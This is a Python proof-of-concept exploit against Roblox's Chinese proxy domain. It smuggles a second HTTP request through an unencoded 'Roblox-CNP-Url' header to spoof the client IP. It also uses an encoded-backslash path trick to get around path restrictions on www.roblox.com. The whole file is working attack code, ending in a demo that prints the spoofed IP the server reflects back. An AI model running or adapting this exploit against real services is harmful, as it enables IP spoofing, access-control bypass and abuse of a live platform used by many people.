from http.client import HTTPResponse
from urllib.parse import urlsplit, unquote, quote
import socket
import ssl
import requests
import json

REAL_IP = requests.get("https://api.ipify.org?format=json").json()["ip"]

def spoof_request(method, url, headers=None, data=None, ip=None):
    purl = urlsplit(url)
    path = purl.path + ("?" + purl.query if purl.query else "")

    # bypass path restrictions on www.roblox.com
    if purl.hostname == "www.roblox.com":
        path = "/login%5C.." + path.replace("/", "%5C")
    
    conn = socket.create_connection((purl.hostname.replace("roblox.com", "roblox.qq.com"), 443))
    context = ssl.create_default_context()
    conn = context.wrap_socket(conn, server_hostname=purl.hostname.replace("roblox.com", "roblox.qq.com"))

    # payload that'll "override" the request
    payload = ""
    payload += " HTTP/1.1\r\n"
    payload += "Host: %s\r\n" % purl.hostname
    payload += "Content-Length: *\r\n"
    payload += "Roblox-CNP-True-IP: %s\r\n" % ip
    if headers:
        for key, value in headers.items():
            payload += "%s: %s\n" % (key, value)
    payload += "\r\n"
    if data:
        payload += data

    # calculate the content-length overhead
    # (the actual content of this doesn't matter, only the length)
    overhead = ""
    overhead += " HTTP/1.1\r\n"
    overhead += "Connection: keep-alive\r\n"
    overhead += "Host: %s\r\n" % purl.hostname.lower().replace("roblox.com", "roblox.qq.com", 1)
    overhead += "Roblox-Domain: cn\r\n"
    overhead += "Roblox-CNP-Date: 2021-03-06T20:41:52 08:00\r\n"
    overhead += "Roblox-CNP-Secure: cnGgYV/BzUMyhjw3iIiKi0TD6Q0=\r\n"
    overhead += "Roblox-CNP-True-IP: %s\r\n" % REAL_IP
    # funnily enough, this header is also left unencoded
    overhead += "Roblox-CNP-Url: http://%s%s%s\r\n" % (
        purl.hostname.lower().replace("roblox.com", "roblox.qq.com"),
        unquote(path),
        payload)
    overhead += "Content-Length: 0\r\n"
    overhead += "X-Stgw-Time: 1615034512.456\r\n"
    overhead += "X-Client-Proto: https\r\n"
    overhead += "X-Forwarded-Proto: https\r\n"
    overhead += "X-Client-Proto-Ver: HTTP/1.1\r\n"
    overhead += "X-Real-IP: %s\r\n" % REAL_IP
    overhead += "X-Forwarded-For: %s\r\n\r\n" % REAL_IP
    overhead = overhead.replace("*", str(len(overhead)))
    payload = payload.replace("*", str(len(overhead)))

    # the "real" request that is sent
    request = ""
    request += "%s %s%s HTTP/1.1\r\n" % (method, path, quote(payload))
    request += "Host: %s\r\n" % purl.hostname.replace("roblox.com", "roblox.qq.com")
    request += "Content-Length: 0\r\n"
    request += "\r\n"

    conn.send(request.encode("UTF-8"))

    resp = HTTPResponse(conn)
    resp.begin()
    return resp

if __name__ == "__main__":
    response = spoof_request(
        method="GET",
        url="https://www.roblox.com/game/join.ashx",
        ip="127.0.0.1"
    )
    data = response.read().decode("UTF-8")
    print("Reflected ip: %s" % data.split("ClientIpAddress")[1].split(",")[0])
